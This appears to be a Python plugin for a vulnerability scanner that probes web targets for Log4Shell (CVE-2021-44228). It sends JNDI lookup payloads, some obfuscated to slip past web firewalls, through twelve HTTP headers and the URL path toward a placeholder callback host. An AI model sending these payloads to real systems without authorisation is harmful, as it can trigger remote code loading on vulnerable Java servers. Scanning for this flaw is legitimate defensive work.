# plugins/cve_2021_44228_scanner.py — Cascavel 2026 Intelligence
"""
Log4Shell (CVE-2021-44228) Detection — Cascavel Elite Plugin.

Técnicas: JNDI lookup injection via múltiplos headers HTTP (User-Agent,
X-Forwarded-For, Referer, X-Api-Version, Authorization), path injection,
query param injection, callback detection via unique token generation.

NOTA: Este scanner envia payloads JNDI para detecção. Para confirmação
real, configure um callback OOB (ex: Burp Collaborator, interactsh).
"""

import uuid

import requests

# Headers comuns onde Log4j processa input
INJECTION_HEADERS = [
    "User-Agent",
    "X-Forwarded-For",
    "Referer",
    "X-Api-Version",
    "Authorization",
    "X-Client-IP",
    "X-Remote-IP",
    "X-Remote-Addr",
    "X-Originating-IP",
    "Contact",
    "Forwarded",
    "Origin",
]

# Payloads com variações de bypass de WAF
JNDI_PAYLOADS = [
    "${jndi:ldap://{{CALLBACK}}/a}",
    "${${lower:j}ndi:${lower:l}d${lower:a}p://{{CALLBACK}}/b}",
    "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{CALLBACK}}/c}",
    "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//{{CALLBACK}}/d}",
    "${jndi:dns://{{CALLBACK}}/e}",
]


def _generate_callback_token():
    """Gera token único para identificar callbacks OOB."""
    return f"cascavel-{uuid.uuid4().hex[:12]}"


def _test_headers(url, callback_base, timeout):
    """Testa injeção JNDI via múltiplos headers."""
    results = []
    for header in INJECTION_HEADERS:
        token = _generate_callback_token()
        callback = f"{token}.{callback_base}"
        for payload_tpl in JNDI_PAYLOADS[:2]:  # Limita a 2 payloads por header
            payload = payload_tpl.replace("{{CALLBACK}}", callback)
            try:
                headers = {header: payload}
                r = requests.get(url, headers=headers, timeout=timeout, allow_redirects=False)
                results.append(
                    {
                        "header": header,
                        "payload": payload[:50] + "...",
                        "token": token,
                        "status": r.status_code,
                        "response_time_ms": int(r.elapsed.total_seconds() * 1000),
                    }
                )
            except requests.Timeout:
                results.append(
                    {
                        "header": header,
                        "token": token,
                        "status": "TIMEOUT",
                        "nota": "Timeout pode indicar processamento JNDI",
                    }
                )
            except Exception:
                continue
    return results


def _test_path_injection(base_url, callback_base, timeout):
    """Testa JNDI injection no path da URL."""
    token = _generate_callback_token()
    callback = f"{token}.{callback_base}"
    payload = f"${{jndi:ldap://{callback}/path}}"
    try:
        url = f"{base_url}/{payload}"
        r = requests.get(url, timeout=timeout, allow_redirects=False)
        return {"token": token, "status": r.status_code, "vector": "path"}
    except Exception:
        return None


def _detect_java_indicators(url, timeout):
    """Detecta indicadores de Java/Spring/Tomcat na resposta."""
    indicators = []
    try:
        r = requests.get(url, timeout=timeout, allow_redirects=True)
        headers_lower = {k.lower(): v for k, v in r.headers.items()}

        # Server header
        server = headers_lower.get("server", "")
        if any(kw in server.lower() for kw in ["tomcat", "jetty", "wildfly", "glassfish"]):
            indicators.append({"type": "server_header", "value": server})

        # X-Powered-By
        powered = headers_lower.get("x-powered-by", "")
        if any(kw in powered.lower() for kw in ["java", "servlet", "jsp", "spring"]):
            indicators.append({"type": "x-powered-by", "value": powered})

        # Error pages with Java stack traces
        if any(
            kw in r.text.lower()
            for kw in [
                "java.lang",
                "javax.",
                "org.apache",
                "org.springframework",
                "stacktrace",
                "tomcat",
                ".jsp",
            ]
        ):
            indicators.append({"type": "body_indicator", "value": "Java patterns in response body"})

    except Exception:
        pass
    return indicators


def run(target, ip, open_ports, banners):
    """
    Scanner Log4Shell (CVE-2021-44228) 2026-Grade — JNDI Injection Detection.

    Técnicas: JNDI injection via 12 headers HTTP, 5 payloads (WAF bypass),
    path injection, Java/Spring/Tomcat fingerprinting, callback token
    generation para detecção OOB. Configure interactsh ou Burp Collaborator
    como callback para confirmação real.
    """
    _ = (ip, open_ports, banners)

    url = f"http://{target}"
    timeout = 8
    callback_base = "YOUR_OOB_CALLBACK.example.com"
    vulns = []

    # 1. Java fingerprinting
    java_indicators = _detect_java_indicators(url, timeout)

    # 2. Header injection tests
    header_results = _test_headers(url, callback_base, timeout)

    # 3. Path injection
    _test_path_injection(url, callback_base, timeout)

    # 4. Detect anomalies (timeouts ou delays suspeitos)
    suspicious_timeouts = [r for r in header_results if r.get("status") == "TIMEOUT"]
    slow_responses = [
        r for r in header_results if isinstance(r.get("response_time_ms"), int) and r["response_time_ms"] > 5000
    ]

    if suspicious_timeouts:
        vulns.append(
            {
                "tipo": "LOG4J_TIMEOUT_ANOMALY",
                "severidade": "ALTO",
                "count": len(suspicious_timeouts),
                "descricao": (
                    f"{len(suspicious_timeouts)} headers causaram timeout"
                    " — possível processamento JNDI! Configure OOB callback para confirmar."
                ),
            }
        )

    if slow_responses:
        vulns.append(
            {
                "tipo": "LOG4J_SLOW_RESPONSE",
                "severidade": "MEDIO",
                "count": len(slow_responses),
                "descricao": f"{len(slow_responses)} respostas lentas (>5s) — possível indicador de JNDI lookup",
            }
        )

    if java_indicators:
        vulns.append(
            {
                "tipo": "JAVA_STACK_DETECTED",
                "severidade": "INFO",
                "indicators": java_indicators,
                "descricao": "Java/Spring/Tomcat detectado — alvo potencial para Log4Shell",
            }
        )

    return {
        "plugin": "cve_2021_44228_scanner",
        "versao": "2026.1",
        "tecnicas": [
            "jndi_header_injection",
            "waf_bypass_payloads",
            "path_injection",
            "java_fingerprint",
            "oob_token_generation",
            "timeout_anomaly_detection",
        ],
        "resultados": {
            "java_indicators": java_indicators,
            "headers_tested": len(header_results),
            "tokens_generated": [r.get("token") for r in header_results if r.get("token")][:5],
            "vulns": vulns,
            "nota": "Configure 'YOUR_OOB_CALLBACK.example.com' com interactsh/Burp "
            "Collaborator para confirmação real de callbacks JNDI",
        },
    }
